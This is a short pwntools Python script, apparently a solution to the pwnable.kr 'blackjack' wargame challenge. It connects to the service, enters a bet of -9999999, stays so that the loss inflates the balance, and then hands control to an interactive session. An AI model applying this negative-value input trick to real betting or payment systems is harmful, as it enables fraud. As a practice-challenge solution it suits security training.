from pwn import *

p = remote('pwnable.kr',10010)

p.sendlineafter(b'Are You Ready?', b'Y')
p.sendlineafter(b'Choice:', b'1')
p.sendlineafter(b'Enter Bet:', b'-9999999')
p.sendlineafter(b'Please Enter H to Hit or S to Stay.', b'S')
p.sendlineafter(b'Please Enter Y for Yes or N for No', b'Y')

p.interactive()